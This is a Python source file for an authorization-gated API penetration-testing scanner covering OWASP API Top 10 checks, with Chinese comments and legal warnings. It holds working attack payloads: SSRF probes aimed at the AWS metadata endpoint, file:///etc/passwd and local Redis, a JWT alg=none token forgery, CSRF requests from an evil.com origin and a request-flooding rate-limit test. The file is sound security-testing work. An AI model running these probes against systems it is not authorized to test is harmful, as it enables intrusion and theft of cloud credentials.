# SPDX-License-Identifier: MIT
# NOTE: api_security_scanner_v2.py is the enhanced version (comprehensive scan, shadow APIs).
# This v1 provides simpler single-endpoint scans (CORS, CSRF, JWT, rate_limit).
"""
API 安全测试 - OWASP API Top 10 覆盖
- API1: BOLA（越权访问对象）
- API2: 鉴权失效
- API3: 属性级越权
- API4: 资源消耗（DoS）
- API5: 功能级权限失效
- API6: 业务流滥用
- API7: SSRF
- API8: 配置错误
- API9: 库存清单管理（影子 API）
- API10: 不安全消费第三方

⚠️  SECURITY · 法律 / 合规 ⚠️
本模块所有 offensive 函数默认 **refuse**。授权方式：
    export TAGENT_PENTEST_AUTHORIZED=1   # 显式确认拥有书面渗透授权
仅在以下场景启用：
    - 你拥有的资产
    - 持书面授权的客户 / CTF 靶场 / bug bounty in-scope target
未授权对第三方系统运行可能违反：CFAA（美国）/ 网络安全法（中国）/ 等同地方法律。

特别风险：
    - test_ssrf AWS metadata + file:// 预设默认 **关闭**（confirm_metadata_probe=True 才启用）。
      理由：探 169.254.169.254 会触发 GuardDuty / CloudWatch 告警；file:// 属 LFI signature。
    - test_csrf / test_jwt_none_alg 实际伪造请求，可能改写目标数据。
"""
import json
import logging
import os
from typing import Dict, List, Optional
from urllib.parse import urljoin

import requests

logger = logging.getLogger(__name__)


# ===== 授权 gate =====

PENTEST_AUTHORIZED = os.getenv("TAGENT_PENTEST_AUTHORIZED") == "1"


def _require_authorized(op: str) -> None:
    """Refuse offensive op unless TAGENT_PENTEST_AUTHORIZED=1."""
    if not PENTEST_AUTHORIZED:
        raise RuntimeError(
            f"pentest op '{op}' refused: set TAGENT_PENTEST_AUTHORIZED=1 to enable. "
            "Authorize ONLY on assets you own / have written pentest authorization. "
            "Risks: CFAA / 网络安全法 violation, IDS alerts, target data corruption."
        )


# ===== API1 BOLA / IDOR（越权访问对象） =====

def test_idor(base_url: str, endpoint_template: str,
              own_id: str, other_id: str,
              own_token: str, expected_blocked: bool = True) -> Dict:
    """
    用 own_token 访问 other_id 的资源，应被拒绝（403/404）。
    endpoint_template: "/api/users/{id}/profile"
    """
    _require_authorized("test_idor")
    url = urljoin(base_url, endpoint_template.format(id=other_id))
    r = requests.get(url, headers={"Authorization": f"Bearer {own_token}"}, timeout=10)
    blocked = r.status_code in (401, 403, 404)
    return {
        "test": "IDOR",
        "url": url,
        "status_code": r.status_code,
        "blocked": blocked,
        "pass": blocked == expected_blocked,
        "vulnerability": not blocked and expected_blocked,
    }


# ===== API2 鉴权失效 =====

def test_no_auth(url: str, method: str = "GET") -> Dict:
    """无 token 访问受保护资源应被拒"""
    _require_authorized("test_no_auth")
    r = requests.request(method, url, timeout=10)
    return {
        "test": "missing_auth",
        "url": url,
        "status_code": r.status_code,
        "vulnerability": r.status_code == 200,
    }


def test_invalid_token(url: str, invalid_token: str = "invalid.jwt.token") -> Dict:
    _require_authorized("test_invalid_token")
    r = requests.get(url, headers={"Authorization": f"Bearer {invalid_token}"}, timeout=10)
    return {
        "test": "invalid_token",
        "status_code": r.status_code,
        "vulnerability": r.status_code == 200,
    }


# ===== API4 资源消耗 / 限流 =====

def test_rate_limit(url: str, total: int = 100, headers: Optional[Dict] = None) -> Dict:
    """连续请求 N 次，验证限流是否生效（429 状态）"""
    _require_authorized("test_rate_limit")
    statuses = []
    for _ in range(total):
        try:
            r = requests.get(url, headers=headers or {}, timeout=5)
            statuses.append(r.status_code)
        except Exception:
            statuses.append(-1)
    rate_limited = sum(1 for s in statuses if s == 429)
    return {
        "test": "rate_limit",
        "total_requests": total,
        "rate_limited_count": rate_limited,
        "has_protection": rate_limited > 0,
    }


# ===== API7 SSRF =====

def test_ssrf(url: str, vulnerable_param: str = "url",
              probe_targets: Optional[List[str]] = None,
              confirm_metadata_probe: bool = False) -> Dict:
    """探测 SSRF：用内网地址试探。

    必须传 probe_targets，否则 raises ValueError。
    AWS metadata (169.254.169.254) + file:///etc/passwd + localhost 高风险预设仅在
    confirm_metadata_probe=True 时启用（触发 GuardDuty / LFI signature）。
    """
    _require_authorized("test_ssrf")
    if probe_targets is None:
        if not confirm_metadata_probe:
            raise ValueError(
                "test_ssrf requires explicit probe_targets list. "
                "Pass confirm_metadata_probe=True to use AWS metadata + file:// preset "
                "(triggers GuardDuty / LFI signature; ONLY on AWS accounts you own)."
            )
        probe_targets = [
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://localhost:22",
            "http://127.0.0.1:6379",
            "file:///etc/passwd",
        ]
    findings = []
    for probe in probe_targets:
        try:
            r = requests.get(url, params={vulnerable_param: probe}, timeout=10)
            # 响应包含敏感字符串则疑似漏洞
            suspicious = any(kw in r.text for kw in ["root:", "instance-id", "ami-id", "redis"])
            findings.append({"probe": probe, "status": r.status_code, "suspicious": suspicious})
        except Exception as e:
            findings.append({"probe": probe, "error": str(e)})
    return {"test": "SSRF", "findings": findings,
            "vulnerability": any(f.get("suspicious") for f in findings)}


# ===== JWT 攻击 =====

def test_jwt_none_alg(target_url: str, original_token: str) -> Dict:
    """JWT alg=none 攻击：把签名置空，alg 改 none"""
    _require_authorized("test_jwt_none_alg")
    import base64
    parts = original_token.split(".")
    if len(parts) != 3:
        return {"error": "非 JWT 格式"}
    header = {"alg": "none", "typ": "JWT"}
    new_header = base64.urlsafe_b64encode(
        json.dumps(header).encode()
    ).decode().rstrip("=")
    forged = f"{new_header}.{parts[1]}."
    r = requests.get(target_url, headers={"Authorization": f"Bearer {forged}"}, timeout=10)
    return {
        "test": "JWT_none_alg",
        "status_code": r.status_code,
        "vulnerability": r.status_code == 200,
    }


# ===== CORS 配置 =====

def test_cors(url: str, malicious_origin: str = "https://evil.com") -> Dict:
    r = requests.options(url, headers={
        "Origin": malicious_origin,
        "Access-Control-Request-Method": "GET",
    }, timeout=10)
    allowed = r.headers.get("Access-Control-Allow-Origin", "")
    return {
        "test": "CORS",
        "allowed_origin": allowed,
        "vulnerability": allowed == "*" or allowed == malicious_origin,
    }


# ===== CSRF（GET 等价于 POST 危险点）=====

def test_csrf(post_url: str, body: Dict, session_cookie: Optional[Dict] = None) -> Dict:
    """无 CSRF token / 无 origin 验证下的写操作"""
    _require_authorized("test_csrf")
    headers = {"Origin": "https://evil.com"}
    r = requests.post(post_url, json=body, cookies=session_cookie or {}, headers=headers, timeout=10)
    return {
        "test": "CSRF",
        "status_code": r.status_code,
        "vulnerability": r.status_code in (200, 201, 204),
    }


# ===== 综合扫描 =====

def scan_api(base_url: str, endpoints: List[Dict], token: str) -> Dict:
    """
    综合扫 API。endpoints: [{"path": "/api/users/{id}", "method": "GET"}]
    """
    results = []
    for ep in endpoints:
        url = urljoin(base_url, ep["path"])
        if "{id}" in url:
            r = test_idor(base_url, ep["path"], own_id="1", other_id="2", own_token=token)
            results.append(r)
        results.append(test_no_auth(url.replace("{id}", "1"), ep.get("method", "GET")))
        results.append(test_invalid_token(url.replace("{id}", "1")))
    vuln_count = sum(1 for r in results if r.get("vulnerability"))
    return {"endpoints_tested": len(endpoints), "tests_run": len(results),
            "vulnerabilities": vuln_count, "details": results}


if __name__ == "__main__":
    import argparse
    logging.basicConfig(level=logging.INFO)
    parser = argparse.ArgumentParser(description="API 安全扫描")
    sub = parser.add_subparsers(dest="cmd")
    rl = sub.add_parser("rate-limit"); rl.add_argument("url"); rl.add_argument("--total", type=int, default=100)
    ss = sub.add_parser("ssrf")
    ss.add_argument("url")
    ss.add_argument("--param", default="url")
    ss.add_argument("--probe", action="append", dest="probe_targets",
                    help="可重复; e.g. --probe http://10.0.0.1/")
    ss.add_argument("--confirm-metadata-probe", action="store_true",
                    help="启用 AWS metadata + file:// 预设 probe (触发 GuardDuty / LFI signature)")
    cr = sub.add_parser("cors"); cr.add_argument("url")
    args = parser.parse_args()
    if args.cmd == "rate-limit":
        print(json.dumps(test_rate_limit(args.url, args.total), indent=2))
    elif args.cmd == "ssrf":
        print(json.dumps(test_ssrf(args.url, args.param,
                                   probe_targets=args.probe_targets,
                                   confirm_metadata_probe=args.confirm_metadata_probe),
                         indent=2, ensure_ascii=False))
    elif args.cmd == "cors":
        print(json.dumps(test_cors(args.url), indent=2))
